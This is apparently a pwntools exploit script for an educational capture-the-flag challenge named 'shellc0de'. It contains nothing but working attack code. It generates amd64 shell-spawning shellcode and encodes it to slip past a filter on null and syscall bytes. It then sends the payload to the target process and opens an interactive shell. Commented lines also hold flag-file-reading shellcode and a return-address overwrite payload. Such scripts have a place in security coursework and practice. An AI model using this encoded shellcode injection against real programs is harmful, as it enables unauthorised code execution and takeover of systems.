from pwn import *
from base64 import *

context.arch = 'amd64'
host = 'edu-ctf.csie.org'
#y = remote( host , 10150 )
y = process('./shellc0de')
'''
sc = asm(
    shellcraft.pushstr( "/home/shellc0de/flag" ) +
    shellcraft.open( 'rsp' , 0 , 0 ) +
    shellcraft.read( 'rax' , 'rsp' , 0x100 ) +
    shellcraft.write( 1 , 'rsp' , 0x100 )
)
'''
#print(sc)
context.clear(arch='amd64')
#shellcode = asm(shellcraft.sh())
sc = asm(shellcraft.sh())
avoid = b'\x00\x0f\x05'
#encoded = pwnlib.encoders.i386.xor.encode(sc, avoid)
encoded = pwnlib.encoders.encoder.encode(sc, avoid)
print(encoded)
a = y.recvline()
#print(a)
y.sendline(encoded)

#y.sendlineafter( ':)' , 'a' * 0x28 + p64( 0x6010a0 ) )
y.interactive()
#y.interactive()

print(a)
